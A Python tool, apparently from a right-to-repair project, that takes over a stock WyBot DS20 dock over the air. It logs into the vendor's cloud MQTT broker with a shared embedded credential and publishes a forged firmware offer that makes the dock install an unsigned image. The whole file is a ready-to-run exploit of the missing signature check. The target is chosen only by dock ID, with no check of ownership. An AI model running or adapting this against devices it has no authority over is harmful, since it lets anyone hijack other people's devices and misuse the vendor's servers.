#!/usr/bin/env python3
"""
flash_from_stock.py  --  one-shot "take over a STOCK WyBot dock with ESPHome, over the air".

This is the user-facing wrapper around the stage-1 takeover that actually worked on a real
DS20 dock. It does the whole dance in one command:

  1. Validates your firmware image is a *bootable* ESP32-C3 ESP-IDF app (magic 0xE9, chip_id 5,
     valid appended SHA-256, acceptable max-chip-rev). This is the single most important step:
     the stock bootloader has **no rollback**, so a non-bootable first image bricks the dock
     until it is opened and reflashed over UART.
  2. Serves that image over plain HTTP on your LAN (the dock downloads it over HTTP, by design).
  3. Publishes a forged firmware *offer* on the vendor MQTT topic
     `/device/OTA/reply_all_firmware_info/<dockId>`. The dock stores it as the "offered" version
     for the `iot` (ESP32-C3) board; because offered > installed for a hardwareVer-matched board,
     the dock's own OTA orchestrator downloads your URL, md5-verifies it, esp_ota-writes the
     inactive slot, flips the boot partition, and reboots into ESPHome.
  4. Streams the dock's OTA progress / error codes until it's done.

Why this works: the stock iot image accepts UNSIGNED images with no project-name / identity /
version / downgrade gate (MD5 + CRC32 only). See docs/ota-flashing.md and docs/ota-security.md.
This is documented as a right-to-repair finding on the author's OWN hardware.

-------------------------------------------------------------------------------------------------
!!!  READ THIS BEFORE RUNNING  -------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
  * IRREVERSIBLE FIRST FLASH. No bootloader rollback. If the image you serve does not boot, the
    dock is dead until you open it and reflash over UART. PRE-VALIDATE the exact image on a spare
    ESP32-C3-MINI-1 over USB first (confirm it boots + joins WiFi). This script's header check is
    necessary but NOT sufficient -- only a real boot on a spare module proves the image.
  * Your ESPHome config MUST enable a fallback AP + captive_portal so a WiFi typo is recoverable
    over the air (see esphome/wybot-dock-bridge.yaml).
  * This is for YOUR OWN device. The vendor MQTT credential is a single shared credential baked
    into every unit (not a per-user secret); supply it via env, below.
  * After the takeover, never use this again -- update via ESPHome OTA (`esphome run`). To go
    back to stock, use scripts/esphome_revert_to_stock.sh.

Credentials (shared vendor MQTT credential; provide via env):
    export WYBOT_MQTT_HOST=mqtt.wybotpool.com WYBOT_MQTT_PORT=1883
    export WYBOT_MQTT_USER=...  WYBOT_MQTT_PASS=...

Typical use:
    # build the replacement image first (produces .esphome/build/wybot-dock/build/firmware.ota.bin)
    uvx esphome compile esphome/wybot-dock-bridge.yaml

    # dry-run: validate the image + print the exact MQTT offer, publish nothing
    python3 scripts/flash_from_stock.py --device <dockId> --host-ip 192.168.1.50 --dry-run

    # arm for real (must pass --yes)
    python3 scripts/flash_from_stock.py --device <dockId> --host-ip 192.168.1.50 --yes
"""
import argparse, asyncio, hashlib, http.server, json, os, socketserver, struct, sys, threading, time

# Default location of the ESPHome-built OTA image (esp-idf build).
DEFAULT_BIN = ".esphome/build/wybot-dock/build/firmware.ota.bin"
ESP_CHIP_IDS = {0: "ESP32", 5: "ESP32-C3", 2: "ESP32-S2", 9: "ESP32-S3", 12: "ESP32-C2", 13: "ESP32-C6"}


def md5_of(path):
    h = hashlib.md5()
    with open(path, "rb") as f:
        for b in iter(lambda: f.read(65536), b""):
            h.update(b)
    return h.hexdigest()


def validate_image(path, expect_chip_id=5):
    """Hard brick-prevention gate: confirm this is a bootable ESP32-C3 ESP-IDF app.

    ESP-IDF image header (esp_image_header_t): byte0 magic 0xE9; byte12 chip_id (u16 LE at 12);
    at offset 23 a flags byte whose bit0 (hash_appended) means the last 32 bytes are the image's
    SHA-256 over everything before them. We also read max_chip_rev_full (u16 LE at offset 14 in
    IDF >= v4.3) for an informational note. We verify magic, chip_id and the appended SHA-256.
    """
    data = open(path, "rb").read()
    problems = []
    if len(data) < 128:
        return ["image too small to be a valid app (%d bytes)" % len(data)], {}
    magic = data[0]
    segment_count = data[1]
    chip_id = struct.unpack_from("<H", data, 12)[0]
    hash_appended = data[23] & 0x01
    max_chip_rev = struct.unpack_from("<H", data, 14)[0]  # minor|major packed; informational only
    info = {
        "bytes": len(data), "magic": "0x%02x" % magic, "segments": segment_count,
        "chip_id": "%d (%s)" % (chip_id, ESP_CHIP_IDS.get(chip_id, "?")),
        "hash_appended": bool(hash_appended), "max_chip_rev_full": max_chip_rev,
    }
    if magic != 0xE9:
        problems.append("bad magic 0x%02x (want 0xE9) -- not an ESP-IDF app" % magic)
    if chip_id != expect_chip_id:
        problems.append("chip_id %d (%s) != expected %d (ESP32-C3) -- wrong-chip image would not boot"
                        % (chip_id, ESP_CHIP_IDS.get(chip_id, "?"), expect_chip_id))
    if not hash_appended:
        problems.append("no appended SHA-256 (hash_appended=0) -- esp_ota_end() will reject it")
    else:
        body, want = data[:-32], data[-32:]
        got = hashlib.sha256(body).digest()
        if got != want:
            problems.append("appended SHA-256 mismatch -- image is corrupt/truncated")
    return problems, info


def serve_dir(directory, port):
    handler = lambda *a, **k: http.server.SimpleHTTPRequestHandler(*a, directory=directory, **k)
    httpd = socketserver.TCPServer(("0.0.0.0", port), handler)
    httpd.allow_reuse_address = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


def build_offer(args, url, md5):
    # The WORKING trigger: an offered firmware entry on reply_all_firmware_info. hardwareVer MUST
    # equal the board's installed hardwareVer exactly; softwareVer MUST be greater than installed.
    entry = {
        "id": 1, "boardID": args.board, "productModel": args.model, "chipType": "",
        "softwareVer": args.swver, "hardwareVer": args.hwver,
        "url": url, "md5": md5, "manual": args.manual,
        "target": "0.0.0", "dependency": "", "enforce": True, "Create": 0,
    }
    return {"firmware": [entry]}


async def main():
    ap = argparse.ArgumentParser(description="Take over a stock WyBot dock with ESPHome, over the air.")
    ap.add_argument("--device", required=True, help="dock id (the MQTT topic suffix for your unit)")
    ap.add_argument("--host-ip", required=True, help="THIS machine's LAN IP that the dock can reach")
    ap.add_argument("--bin", default=DEFAULT_BIN, help="ESPHome OTA image to flash (default: %(default)s)")
    ap.add_argument("--port", type=int, default=8099, help="local HTTP port to serve the image on")
    ap.add_argument("--board", default="iot", help="target board id (the ESP32-C3 is 'iot')")
    ap.add_argument("--model", default="DS20", help="productModel")
    ap.add_argument("--hwver", default="5.127.0", help="MUST equal the board's installed hardwareVer")
    ap.add_argument("--swver", default="2.2.99", help="MUST be greater than the installed softwareVer")
    ap.add_argument("--manual", type=int, default=0, help="0=auto-apply (no app confirm), 1=needs confirm")
    ap.add_argument("--minutes", type=float, default=8, help="how long to stream OTA events before exiting")
    ap.add_argument("--dry-run", action="store_true", help="validate + print the offer, publish nothing")
    ap.add_argument("--yes", action="store_true", help="required to actually arm the (irreversible) flash")
    args = ap.parse_args()

    if not os.path.isfile(args.bin):
        sys.exit("image not found: %s\n(build it first: uvx esphome compile esphome/wybot-dock-bridge.yaml)" % args.bin)

    # 1) brick-prevention gate --------------------------------------------------------------------
    problems, info = validate_image(args.bin)
    print("image: %s" % os.path.abspath(args.bin))
    for k, v in info.items():
        print("  %-18s %s" % (k, v))
    if problems:
        print("\nIMAGE REJECTED -- will not flash (would risk a brick):", file=sys.stderr)
        for p in problems:
            print("  - " + p, file=sys.stderr)
        sys.exit(2)
    print("  image header OK (bootable ESP32-C3 app with valid appended SHA-256)")

    md5 = md5_of(args.bin)
    fname = os.path.basename(args.bin)
    url = "http://%s:%d/%s" % (args.host_ip, args.port, fname)
    offer = build_offer(args, url, md5)
    topic = "/device/OTA/reply_all_firmware_info/%s" % args.device
    print("\nmd5:   %s" % md5)
    print("url:   %s" % url)
    print("topic: %s" % topic)
    print("offer: %s" % json.dumps(offer, separators=(",", ":")))

    if args.dry_run:
        print("\ndry-run: nothing served, nothing published.")
        return

    if not args.yes:
        sys.exit("\nrefusing to arm without --yes. This is an IRREVERSIBLE first flash with no "
                 "bootloader rollback.\nPre-validate the EXACT image on a spare ESP32-C3 over USB "
                 "first, then re-run with --yes.")

    host = os.environ.get("WYBOT_MQTT_HOST", "mqtt.wybotpool.com")
    port = int(os.environ.get("WYBOT_MQTT_PORT", "1883"))
    user, pw = os.environ.get("WYBOT_MQTT_USER"), os.environ.get("WYBOT_MQTT_PASS")
    if not (user and pw):
        sys.exit("Set WYBOT_MQTT_USER / WYBOT_MQTT_PASS (shared vendor MQTT credential).")
    try:
        import aiomqtt
    except ImportError:
        sys.exit("pip install aiomqtt  (or: uvx --with aiomqtt python3 scripts/flash_from_stock.py ...)")

    # 2) serve the image --------------------------------------------------------------------------
    directory = os.path.dirname(os.path.abspath(args.bin)) or "."
    httpd = serve_dir(directory, args.port)
    print("\nserving %s on :%d ..." % (directory, args.port))

    # 3) publish the offer, 4) stream OTA events --------------------------------------------------
    watch = ["/device/OTA/%s/%s" % (t, args.device) for t in (
        "post_update_progress", "post_errcode", "recv_start_update",
        "notify_ready_to_update", "notify_ready_to_update_reply",
        "request_all_firmware_info", "reply_all_firmware_info", "reply_request_all_firmware_info")]
    async with aiomqtt.Client(hostname=host, port=port, username=user, password=pw,
                              identifier="wybot-flash-%d" % int(time.time())) as c:
        for t in watch:
            await c.subscribe(t)
        await c.publish(topic, json.dumps(offer, separators=(",", ":")))
        print("offer published. watching OTA events for %g min (Ctrl-C to stop)...\n" % args.minutes)

        async def pump():
            async for m in c.messages:
                raw = m.payload.decode(errors="replace")
                try:
                    raw = json.dumps(json.loads(raw))
                except Exception:
                    pass
                print("### %s\n%s\n" % (m.topic, raw), flush=True)
                low = raw.lower()
                if '"progress":100' in low.replace(" ", "") or "post_errcode" in str(m.topic):
                    print(">>> terminal OTA event seen; the dock should reboot into ESPHome shortly.")

        try:
            await asyncio.wait_for(pump(), timeout=args.minutes * 60)
        except asyncio.TimeoutError:
            print("done watching. If it flashed, the dock is now on ESPHome (mDNS 'wybot-dock'). "
                  "Update it from here on with ESPHome OTA, not this script.")
        finally:
            httpd.shutdown()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
